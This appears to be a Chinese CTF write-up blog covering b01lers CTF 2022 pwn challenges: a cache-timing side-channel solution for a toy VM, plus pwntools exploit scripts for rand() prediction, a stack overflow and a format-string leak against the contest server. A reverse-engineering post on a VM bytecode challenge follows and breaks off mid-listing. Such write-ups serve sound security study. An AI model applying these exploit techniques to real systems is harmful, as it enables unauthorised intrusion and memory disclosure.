class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>输出的内容是</p><p><img src="/2022/04/25/b01lersCTF2022-pwn/image-20220425125032396.png" alt="image-20220425125032396"></p><p>并不是两个元组！也就是说，上面的key-map的每一个元素，<strong>其实只是每个元素的key值</strong>。</p><p>那么这道题的漏洞点其实就很清楚了。回看reset，有这样一句指令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> self.X03.keys():</span><br><span class="line">    self.X03[k] = <span class="number">0</span> <span class="comment"># X03是访问过的内存</span></span><br></pre></td></tr></table></figure><p>这一步所做的，<strong>其实只是清除了X03下标中的数据，而并没有清除X03的下标！</strong>。</p><blockquote><p>举个例子，我们一开始读入四个数据之后的X03结果为{0:aa,1:bb,2:cc,3:dd}，在reset之后结果是{0:0,1:0,2:0,3:0}。但是在movfrom中，下面的指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> ins.op == <span class="string">&quot;movfrom&quot;</span>:</span><br><span class="line">    X09 = ins.X10 + self.X01[ins.dsp] <span class="comment"># X09是内存下标</span></span><br><span class="line">    X09 = X09 % <span class="built_in">len</span>(self.memory)</span><br><span class="line">    <span class="keyword">if</span> X09 <span class="keyword">in</span> self.X03: <span class="comment">#&lt;----注意这一条</span></span><br><span class="line">        v = self.X03[X09]</span><br><span class="line">        v = (v &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        self.X01[ins.X11] = v <span class="comment"># 这里会读到寄存器里面</span></span><br><span class="line">        self.X05 += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>只是检查<strong>X09这个下标是不是在X03中</strong>。也就是说：<strong>如果我们一开始把随机数当成下标，然后访问这个下标的数据，就会先把随机数对应的下标加载到X03，那么下次访问，将会少一个time周期。根据这个可以侧信道攻击得到随机数</strong></p><p><strong>这正是大名鼎鼎的meltdown的原版复现！</strong></p></blockquote><p>另外需要注意的是，reset之后程序下一条指令并不是reset后面的指令。比如说下面的例子。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movc r9 0</span><br><span class="line">movfrom r0 0 r9</span><br><span class="line">reset</span><br><span class="line">movfrom r1 1 r9</span><br></pre></td></tr></table></figure><p>当第一次执行到reset之后，程序下一条指令是<code>movc r9 0</code>。这是因为reset清空了X05，导致我们需要从头执行。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>总结一下思路：首先是用<code>movfrom</code>读出随机数，然后访问随机数下标对应的内存。访问了之后调用reset。这应该回到我们开始的位置。但是除了之前提到的下标之外，所有信息全被清空了。为此，我们需要在程序一开始加上一个访问第0个内存的判断。如果访问过第0个，说明已经reset过，反之就是第一次访问。在第二次访问时，需要判断从零开始访问所有memory的时间，如果找到时间大于2的，就记录下来。这个下标就是随机数。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>在写的时候碰到的问题：<strong>由于限制了我们能够执行的指令数目至多为20000条，因此不能遍历所有内存。</strong>没看解法之前，感觉没有想法，按理来说是要全部看一遍的，不然就是思路错了。</p><p>看了wp才发现，更巧妙的做法是**每次不直接读取对应的随机数，之后保存在随机数下标位置，而是获得随机数的二进制表示下的所有bit。考虑到给定的随机数是有范围的，至多可以用32个bit表示。那么我们可以为每个数字，在内存下标中记录二进制表示方法..感觉难以用语言描述。比如说下面的例子。</p><p><img src="/2022/04/25/b01lersCTF2022-pwn/image-20220425170001768.png" alt="image-20220425170001768"></p><p>我们假定直到是从256开始的。那么我们规定，如果那个对应的二进制位置(比如说是第i位置)是0，就访问(256+i),让内存中cache这个数据。上面就相当于知道了这个数字的二进制表示是第一位(256)是0，第二位(257)是0，…以此类推，算满32位，就可以恢复出原始数字。</p><p>通过这种方法，访问每个数字时只需要访问内存32次，并且能够保存数字顺序。实在是很巧妙。</p><p>exp没有手写，调试了一边了解了原理。这位作者估计也是觉得没有注释太麻烦了，实现了一个前端编译器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">movfrom r0 1337 r0</span></span><br><span class="line"><span class="string">movc r3 3</span></span><br><span class="line"><span class="string">time</span></span><br><span class="line"><span class="string">sub r0 r3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">movc r1 1 ; always one</span></span><br><span class="line"><span class="string">movc r8 2 ; multiplier</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmpz after_reset ; jmp to reset code</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">; first execution code</span></span><br><span class="line"><span class="string">before_reset:</span></span><br><span class="line"><span class="string">movc r2 1 ; mask</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">main_loop:</span></span><br><span class="line"><span class="string">movfrom r0 0 r7</span></span><br><span class="line"><span class="string">and r0 r2</span></span><br><span class="line"><span class="string">jmpz next_bit</span></span><br><span class="line"><span class="string">movfrom r0 256 r5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">next_bit:</span></span><br><span class="line"><span class="string">mul r2 r8</span></span><br><span class="line"><span class="string">add r5 r1</span></span><br><span class="line"><span class="string">mov r0 r2</span></span><br><span class="line"><span class="string">jmpz next_var</span></span><br><span class="line"><span class="string">jmp main_loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">next_var:</span></span><br><span class="line"><span class="string">add r7 r1; set r7=r7+1</span></span><br><span class="line"><span class="string">mov r0 r7 ; set r0: r7</span></span><br><span class="line"><span class="string">jmpg r3 do_reset ; r3=3</span></span><br><span class="line"><span class="string">jmp before_reset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">do_reset:</span></span><br><span class="line"><span class="string">reset </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">; after reset code</span></span><br><span class="line"><span class="string">after_reset:</span></span><br><span class="line"><span class="string">xor r9 r9</span></span><br><span class="line"><span class="string">movc r2 1 ; mask</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">recover_var:</span></span><br><span class="line"><span class="string">time</span></span><br><span class="line"><span class="string">mov r4 r0</span></span><br><span class="line"><span class="string">movfrom r0 256 r5</span></span><br><span class="line"><span class="string">time</span></span><br><span class="line"><span class="string">sub r0 r4</span></span><br><span class="line"><span class="string">sub r0 r3</span></span><br><span class="line"><span class="string">sub r0 r1</span></span><br><span class="line"><span class="string">jmpz r_next_bit</span></span><br><span class="line"><span class="string">or r9 r2</span></span><br><span class="line"><span class="string">r_next_bit:</span></span><br><span class="line"><span class="string">mul r2 r8</span></span><br><span class="line"><span class="string">add r5 r1</span></span><br><span class="line"><span class="string">mov r0 r2</span></span><br><span class="line"><span class="string">jmpz r_next_var</span></span><br><span class="line"><span class="string">jmp recover_var</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r_next_var:</span></span><br><span class="line"><span class="string">movto r9 0 r7</span></span><br><span class="line"><span class="string">add r7 r1</span></span><br><span class="line"><span class="string">mov r0 r7</span></span><br><span class="line"><span class="string">jmpg r3 fin</span></span><br><span class="line"><span class="string">jmp after_reset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fin:</span></span><br><span class="line"><span class="string">movfrom r0 0 r2</span></span><br><span class="line"><span class="string">movfrom r1 1 r2</span></span><br><span class="line"><span class="string">movfrom r3 3 r2</span></span><br><span class="line"><span class="string">movfrom r2 2 r2</span></span><br><span class="line"><span class="string">magic</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">code = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> code.split(<span class="string">&#x27;\n&#x27;</span>)]</span><br><span class="line">code = [line <span class="keyword">for</span> line <span class="keyword">in</span> code <span class="keyword">if</span> line <span class="keyword">and</span> <span class="keyword">not</span> line.startswith(<span class="string">&#x27;;&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">labels = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(code):</span><br><span class="line">    <span class="keyword">if</span> line.endswith(<span class="string">&#x27;:&#x27;</span>):</span><br><span class="line">        label = line[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">assert</span> label <span class="keyword">not</span> <span class="keyword">in</span> labels</span><br><span class="line">        labels[label] = i</span><br><span class="line">        <span class="keyword">del</span> code[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(code):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;;&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        line = re.sub(<span class="string">r&#x27;;.*&#x27;</span>, <span class="string">&#x27;&#x27;</span>, line).strip()</span><br><span class="line"></span><br><span class="line">    op = line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> op[<span class="number">0</span>] <span class="keyword">in</span> [<span class="string">&#x27;jmp&#x27;</span>, <span class="string">&#x27;jmpz&#x27;</span>]:</span><br><span class="line">        op[<span class="number">1</span>] = <span class="built_in">str</span>(labels[op[<span class="number">1</span>]] - i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op[<span class="number">0</span>] <span class="keyword">in</span> [<span class="string">&#x27;jmpg&#x27;</span>]:</span><br><span class="line">        op[<span class="number">2</span>] = <span class="built_in">str</span>(labels[op[<span class="number">2</span>]] - i)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(op))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> * <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p>这道题除了让我第一次知道侧信道攻击在CTF中的实际应用(出的太好了)，还提出了一种优化meltdown攻击的方法。</p><p>之前我们做meltdown时，需要总共设置一个256*(4096)的空间，这道题给了我们启发。<strong>实际上，只需要8*4096个空间即可。我们可以用每个空间分别保存这个asci字符的每一位，一样可以恢复出256种数据。</strong>归根结底，还是一个编码问题(题外话)</p><p>这题没做出来确实不亏，因为即使知道了这个cache可以缓存，一开始也很难想到用二进制记录数据。</p><h1 id="gambler-baby"><a href="#gambler-baby" class="headerlink" title="gambler baby"></a>gambler baby</h1><p>直接预测rand()即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./gambler-baby1.tgz&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;ctf.b01lers.com&#x27;</span>,<span class="number">9202</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(libc_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    a = <span class="built_in">chr</span>(libc.rand()%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    b = <span class="built_in">chr</span>(libc.rand()%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    c = <span class="built_in">chr</span>(libc.rand()%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    d = <span class="built_in">chr</span>(libc.rand()%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    payload = a+b+c+d</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;letters:&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br></pre></td></tr></table></figure><h1 id="gambler-overflow"><a href="#gambler-overflow" class="headerlink" title="gambler overflow"></a>gambler overflow</h1><p>裸栈溢出，但是不需要改返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./gambler_overflow&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;ctf.b01lers.com&#x27;</span>,<span class="number">9203</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(libc_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x7</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span>+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;letters: &#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="gambler-supreme"><a href="#gambler-supreme" class="headerlink" title="gambler supreme"></a>gambler supreme</h1><p>格式化字符串即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.pyplot <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./gambler_supreme&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;ctf.b01lers.com&#x27;</span>,<span class="number">9201</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&quot;%9$saaaa&quot;</span> + p64(<span class="number">0x404050</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;(inclusive):&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4016D8&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;letters:&#x27;</span>,payload)</span><br><span class="line">flag_place = u64(io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">4</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag_place: &#x27;</span> + <span class="built_in">hex</span>(flag_place))</span><br><span class="line">payload = <span class="string">b&quot;%9$saaaa&quot;</span> + p64(flag_place)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;letters:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
            <tag> wp </tag>
            
            <tag> fmtstr </tag>
            
            <tag> meltdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackpark2022_shiftycode</title>
      <link href="/2022/04/15/hackpark2022-shiftycode/"/>
      <url>/2022/04/15/hackpark2022-shiftycode/</url>
      
        <content type="html"><![CDATA[<p>周末做的一个很有趣的逆向，但是没在比赛结束之前做出来。第一次做VM的逆向，也算是打消了对未知的恐惧。感觉还是挺有意思的。</p><span id="more"></span><h1 id="简单逆向"><a href="#简单逆向" class="headerlink" title="简单逆向"></a>简单逆向</h1><p>题目是shiftycode，VM的源码也十分简单。主要逻辑全部在main函数中。</p><p>文件首先接受一个bytecode，这个字节码题目也给了，其中就包含了检验flag的逻辑。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>我们直接运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shiftycode ./bin</span><br></pre></td></tr></table></figure><p>程序会给我们输出很多字节码。逻辑如下。这也就方便我们观察字节码是什么。</p><p><img src="/2022/04/15/hackpark2022-shiftycode/image-20220415162712847.png" alt="image-20220415162712847"></p><p>接着就到了循环。其实很好逆向，就是一个循环，类似switch-case语句，不断读取字节码，识别字节码的指令，然后根据指令做相应的事情。</p><p><img src="/2022/04/15/hackpark2022-shiftycode/image-20220415162756221.png" alt="image-20220415162756221"></p><p>这里可以看到shiftycode的含义了。可以看到在每一次判断oprand之后，都会对当前的oprand自增。这样相当于下一次调用相同指令的code不一样。(如上面的++add)。</p><p>同时,在add中，如果第二个操作数是1和2，对应的行为也有差别</p><p>其余的逻辑很简单。这里举一个例子说明。其他的结构大同小异。</p><blockquote><p>例如字节码</p><p>04 02 21 05 </p><p>就可以被翻译为   all[0x21] += all[5]。注意第二个字节这里如果是01，就表示第四个字节是一个立即数，如果是02就表示操作数是我们输入的下表为5的位置。其余的还有一些跳转指令、比较指令、加减乘除都有。</p></blockquote><h2 id="整体逻辑"><a href="#整体逻辑" class="headerlink" title="整体逻辑"></a>整体逻辑</h2><p>经过对bytecode的分析，可以大致总结出本题的逻辑。字节码和对应的汇编指令就写在下面了。注意这道题有一些跳转，一开始并不知道是否需要跳转，但是可以看到这些跳转大都是连续的(也就是说一个跳转的下一跳，还是一个跳转。这样最终将越过所有的检验逻辑)因此我最后尝试所有的跳转都无法进行，可以得到结果。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">// 接受用户输入[0,0x25]个字符</span><br><span class="line">06 00 07 01 08 02 09 03 0a 04 0b 05 0c 06 0d 07 </span><br><span class="line">0e 08 0f 09 10 0a 11 0b 12 0c 13 0d 14 0e 15 0f </span><br><span class="line">16 10 17 11 18 12 19 13 1a 14 1b 15 1c 16 1d 17 </span><br><span class="line">1e 18 1f 19 20 1a 21 ff 22 ff 23 ff 24 ff 25 ff </span><br><span class="line">26 ff 27 ff 28 ff 29 ff 2a ff 2b ff 2c ff 2d ff</span><br><span class="line"></span><br><span class="line">// all即为用户输入所储存的地方</span><br><span class="line">// cmd是当前指令指针位置</span><br><span class="line">07 01 00 66 ;if all[0] !=’f&#x27;</span><br><span class="line">05 01 04 ; cmd+4 </span><br><span class="line">08 03 01 6d ;if all[1] &gt;=&#x27;k&#x27;</span><br><span class="line">06 01 04 ; cmd+4</span><br><span class="line">09 04 01 6b ;if all[1] &lt;=&#x27;m&#x27;</span><br><span class="line">07 01 18 ; cmd+0x18 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// x</span><br><span class="line">00 02 1e 02 ; all[0x1e] +=all[2]</span><br><span class="line">01 02 1f 03 ; all[0x1f] +=all[3]</span><br><span class="line">02 02 20 03 ; all[0x20] +=all[3]</span><br><span class="line">03 02 1f 1e ; all[0x1f] +=all[0x1e]</span><br><span class="line">01 02 20 1e ; all[0x20] -=all[0x1e]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0a 01 1f c8  ; if all[0x1f] !=0xc8 </span><br><span class="line">08 01 08 ; cmd+=8 </span><br><span class="line">02 02 1f 20 ; all[0x1f] -=all[0x20]</span><br><span class="line">0b 01 1f c2 ; if all[0x1f]!=0xc2 </span><br><span class="line">09 01 04 ; cmd +=4 </span><br><span class="line">0c 01 04 7b ; if all[0x4] !=&#x27;&#123;&#x27;</span><br><span class="line">0a 01 04 ; cmd+=4 </span><br><span class="line">0d 01 1a 7d ; if all[0x1a] !=&#x27;&#125;&#x27;</span><br><span class="line">0b 01 0c ; cmd+=0xc </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">04 02 21 05 ; all[0x21] += all[5]</span><br><span class="line">05 02 21 07 ; all[0x21] += all[7]</span><br><span class="line">0e 01 21 cc ; if all[0x21] !=0xcc</span><br><span class="line">0c 01 10 ; cmd +=0x10 </span><br><span class="line"></span><br><span class="line">06 02 21 06 ; all[0x21] += all[6]</span><br><span class="line">07 02 22 21 ; all[0x22] += all[0x21]</span><br><span class="line">03 01 22 64 ; all[0x22] -=0x64</span><br><span class="line">0f 01 22 e1 ; if all[0x22] !=0xe1</span><br><span class="line">0d 01 08 ; cmd +=0x8</span><br><span class="line"></span><br><span class="line">04 02 21 05 ; all[0x21] -=all[0x5]</span><br><span class="line"></span><br><span class="line">10 01 21 d8 ; if all[0x21] !=0xd8</span><br><span class="line">0e 01 0c ;cmd +=0xc</span><br><span class="line"></span><br><span class="line">08 02 